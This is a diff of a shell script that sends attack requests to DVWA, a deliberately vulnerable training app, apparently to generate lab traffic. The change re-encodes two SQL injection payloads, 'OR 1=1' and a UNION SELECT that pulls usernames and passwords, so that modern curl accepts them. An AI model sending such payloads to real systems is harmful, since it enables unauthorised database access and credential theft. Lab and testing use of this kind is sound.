@@ -80,8 +80,16 @@ dvwa_login() {
 
 run_sqli() {
     log "sqli"
-    curl -s -b "$COOKIE_JAR" "$BASE/sqli/?id=1' OR 1=1-- -&Submit=Submit" -o /dev/null
-    curl -s -b "$COOKIE_JAR" "$BASE/sqli/?id=1' UNION SELECT user,password FROM users-- -&Submit=Submit" -o /dev/null
+    # -G + --data-urlencode: modern curl (>= 8.x) rejects raw spaces/quotes in
+    # URLs, so build the query string from the payload instead of pasting it in.
+    curl -s -G -b "$COOKIE_JAR" \
+        --data-urlencode "id=1' OR 1=1-- -" \
+        --data-urlencode "Submit=Submit" \
+        "$BASE/sqli/" -o /dev/null
+    curl -s -G -b "$COOKIE_JAR" \
+        --data-urlencode "id=1' UNION SELECT user,password FROM users-- -" \
+        --data-urlencode "Submit=Submit" \
+        "$BASE/sqli/" -o /dev/null
 }
 
 run_xss() {
